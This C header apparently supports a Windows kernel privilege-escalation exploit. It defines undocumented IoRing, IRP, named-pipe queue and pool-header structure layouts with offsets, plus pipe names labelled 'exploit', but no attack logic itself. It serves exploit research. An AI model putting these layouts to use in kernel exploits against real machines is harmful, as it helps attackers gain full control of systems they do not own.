#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <stdio.h>
#include <vector>


#pragma comment(lib, "ntdll.lib")

#define QWORD unsigned long long
#define STATUS_SUCCESS 0
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)11
#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16


typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    /* 0x0000 */ unsigned short UniqueProcessId;
    /* 0x0002 */ unsigned short CreatorBackTraceIndex;
    /* 0x0004 */ unsigned char ObjectTypeIndex;
    /* 0x0005 */ unsigned char HandleAttributes;
    /* 0x0006 */ unsigned short HandleValue;
    /* 0x0008 */ uint64_t Object;
    /* 0x0010 */ unsigned long GrantedAccess;
    /* 0x0014 */ long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO; /* size: 0x0018 */

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    /* 0x0000 */ unsigned long NumberOfHandles;
    /* 0x0008 */ struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION; /* size: 0x0020 */

typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT Type;
    USHORT Reserved;
    ULONG Size;
    ULONG ReferenceCount;
    ULONG Flags;
    _LIST_ENTRY GlobalDataLink;
    PVOID Address;
    ULONG Length;
    CHAR AccessMode;
    ULONG MdlRef;
    struct _MDL* Mdl;
    BYTE MdlRundownEvent[24];       // Real type is KEVENT
    PULONG64 PfnArray;
    BYTE PageNodes[0x20];
} IOP_MC_BUFFER_ENTRY, * PIOP_MC_BUFFER_ENTRY;

// IORING struct on the usermode side (in kernelbase.dll)
typedef struct _HIORING
{
    HANDLE handle;
    BYTE Info[0x30];        // Real type is: NT_IORING_INFO
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
};

typedef struct _NT_IORING_CREATE_FLAGS
{
    /* 0x0000 */ enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;
    /* 0x0004 */ enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;
} NT_IORING_CREATE_FLAGS, * PNT_IORING_CREATE_FLAGS; /* size: 0x0008 */


typedef struct _NT_IORING_INFO
{
    /* 0x0000 */ enum IORING_VERSION IoRingVersion;
    /* 0x0004 */ struct _NT_IORING_CREATE_FLAGS Flags;
    /* 0x000c */ unsigned int SubmissionQueueSize;
    /* 0x0010 */ unsigned int SubmissionQueueRingMask;
    /* 0x0014 */ unsigned int CompletionQueueSize;
    /* 0x0018 */ unsigned int CompletionQueueRingMask;
    /* 0x0020 */ struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    /* 0x0028 */ struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
} NT_IORING_INFO, * PNT_IORING_INFO; /* size: 0x0030 */


typedef struct _IORING_OBJECT
{
    /* 0x0000 */ short Type;
    /* 0x0002 */ short Size;
    /* 0x0008 */ struct _NT_IORING_INFO UserInfo;
    /* 0x0038 */ void* Section;
    /* 0x0040 */ struct _NT_IORING_SUBMISSION_QUEUE* SubmissionQueue;
    /* 0x0048 */ struct _MDL* CompletionQueueMdl;
    /* 0x0050 */ struct _NT_IORING_COMPLETION_QUEUE* CompletionQueue;
    /* 0x0058 */ unsigned __int64 ViewSize;
    /* 0x0060 */ long InSubmit;
    /* 0x0068 */ unsigned __int64 CompletionLock;
    /* 0x0070 */ unsigned __int64 SubmitCount;
    /* 0x0078 */ unsigned __int64 CompletionCount;
    /* 0x0080 */ unsigned __int64 CompletionWaitUntil;
    /* 0x0088 */ BYTE CompletionEvent[24];
    /* 0x00a0 */ unsigned char SignalCompletionEvent;
    /* 0x00a8 */ PVOID CompletionUserEvent;
    /* 0x00b0 */ unsigned int RegBuffersCount;
    /* 0x00b8 */ struct _IOP_MC_BUFFER_ENTRY** RegBuffers;
    /* 0x00c0 */ unsigned int RegFilesCount;
    /* 0x00c8 */ void** RegFiles;
} IORING_OBJECT, * PIORING_OBJECT; /* size: 0x00d0 */

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    );

struct _KDEVICE_QUEUE_ENTRY
{
    struct _LIST_ENTRY DeviceListEntry;                                     //0x0
    ULONG SortKey;                                                          //0x10
    UCHAR Inserted;                                                         //0x14
};

//0xd0 bytes (sizeof)
struct IRP
{
    SHORT Type;                                                             //0x0
    USHORT Size;                                                            //0x2
    struct _MDL* _ptr64 MdlAddress;                                                //0x8
    ULONG Flags;                                                            //0x10
    union
    {
        struct _IRP* _ptr64 MasterIrp;                                             //0x18
        LONG IrpCount;                                                      //0x18
        VOID* _ptr64 SystemBuffer;                                                 //0x18
    } AssociatedIrp;                                                        //0x18
    struct _LIST_ENTRY ThreadListEntry;                                     //0x20
    struct _IO_STATUS_BLOCK IoStatus;                                       //0x30
    CHAR RequestorMode;                                                     //0x40
    UCHAR PendingReturned;                                                  //0x41
    CHAR StackCount;                                                        //0x42
    CHAR CurrentLocation;                                                   //0x43
    UCHAR Cancel;                                                           //0x44
    UCHAR CancelIrql;                                                       //0x45
    CHAR ApcEnvironment;                                                    //0x46
    UCHAR AllocationFlags;                                                  //0x47
    union
    {
        struct _IO_STATUS_BLOCK* _ptr64 UserIosb;                                  //0x48
        VOID* _ptr64 IoRingContext;                                                //0x48
    };
    struct _KEVENT* _ptr64 UserEvent;                                              //0x50
    union
    {
        struct
        {
            union
            {
                VOID(*UserApcRoutine)(VOID* arg1, struct _IO_STATUS_BLOCK* arg2, ULONG arg3); //0x58
                VOID* IssuingProcess;                                       //0x58
            };
            union
            {
                VOID* UserApcContext;                                       //0x60
                struct _IORING_OBJECT* IoRing;                              //0x60
            };
        } AsynchronousParameters;                                           //0x58
        union _LARGE_INTEGER AllocationSize;                                //0x58
    } Overlay;                                                              //0x58
    VOID(*CancelRoutine)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);  //0x68
    VOID* UserBuffer;                                                       //0x70
    union
    {
        struct
        {
            union
            {
                struct _KDEVICE_QUEUE_ENTRY DeviceQueueEntry;               //0x78
                VOID* DriverContext[4];                                     //0x78
            };
            struct _ETHREAD* Thread;                                        //0x98
            CHAR* AuxiliaryBuffer;                                          //0xa0
            struct _LIST_ENTRY ListEntry;                                   //0xa8
            union
            {
                struct _IO_STACK_LOCATION* CurrentStackLocation;            //0xb8
                ULONG PacketType;                                           //0xb8
            };
            struct _FILE_OBJECT* OriginalFileObject;                        //0xc0
        } Overlay;                                                          //0x78
        char Apc[0x58];                                                   //0x78
        VOID* CompletionKey;                                                //0x78
    } Tail;                                                                 //0x78
};

typedef struct {
    uint64_t Flink;
    uint64_t Blink;
    IRP* POINTER_64 Irp;
    uint64_t SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
} DATA_QUEUE_ENTRY;


typedef struct _NP_DATA_QUEUE
{
    LIST_ENTRY Queue;
    ULONG QueueState;
    ULONG BytesInQueue;
    ULONG EntriesInQueue;
    ULONG Quota;
    ULONG QuotaUsed;
    ULONG ByteOffset;
    uint64_t queueTailAddr;
    uint64_t queueTail;
} NP_DATA_QUEUE, * PNP_DATA_QUEUE;

typedef USHORT NODE_TYPE_CODE, * PNODE_TYPE_CODE;
typedef struct _NP_CCB
{
    NODE_TYPE_CODE NodeType;
    DWORD pad1;
    UCHAR NamedPipeState;
    // CompletionMode and ReadMode are merged into 1 list, for each entry, the 1st bit is ReadMode, 2nd bit is CompletionMode
    UCHAR CompletionAndReadMode[2];
    UCHAR pad2;
    SECURITY_QUALITY_OF_SERVICE ClientQos;
    LIST_ENTRY CcbEntry;
    void* Fcb;
    PVOID64 FileObject[2];
    PVOID64 Process;
    NP_DATA_QUEUE DataQueueInbound;
    LIST_ENTRY IrpList;
    char pad3[20];
    NP_DATA_QUEUE DataQueueOutbound;
} NP_CCB, * PNP_CCB;


//0x10 bytes (sizeof)
struct _POOL_HEADER
{
    union
    {
        struct
        {
            USHORT PreviousSize : 8;                                          //0x0
            USHORT PoolIndex : 8;                                             //0x0
            USHORT BlockSize : 8;                                             //0x2
            USHORT PoolType : 8;                                              //0x2
        };
        ULONG Ulong1;                                                       //0x0
    };
    ULONG PoolTag;                                                          //0x4
    union
    {
        unsigned long long ProcessBilled;                                    //0x8
        struct
        {
            USHORT AllocatorBackTraceIndex;                                 //0x8
            USHORT PoolTagHash;                                             //0xa
        };
    };
};

typedef NTSTATUS(__stdcall* NTFSCONTROLFILE)(
    HANDLE           fileHandle,
    HANDLE           event,
    PVOID apcRoutine,
    void* ApcContext,
    IO_STATUS_BLOCK* ioStatusBlock,
    unsigned long    FsControlCode,
    void* InputBuffer,
    unsigned long    InputBufferLength,
    void* OutputBuffer,
    unsigned long    OutputBufferLength
    );

struct _IO_COMPLETION_CONTEXT
{
    unsigned long long Port;         //0x0
    unsigned long long Key;          //0x8
    unsigned long long UsageCount;   //0x10
};


typedef struct _FAST_MUTEX
{
    LONG Count;                                                             //0x0
    VOID* Owner;                                                            //0x8
    ULONG Contention;                                                       //0x10
    char Event[0x18];                                                       //0x18
    ULONG OldIrql;                                                          //0x30
} FAST_MUTEX, * PFAST_MUTEX;


typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID  Key;
} FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;

typedef struct {
    HANDLE Read;
    HANDLE Write;
} PIPE_HANDLES;

#define PIPE_NAME_1 "\\\\.\\pipe\\exploit1"
#define PIPE_NAME_2 "\\\\.\\pipe\\exploit2"
#define PIPE_NAME_PAD "\\\\.\\pipe\\exploitPad"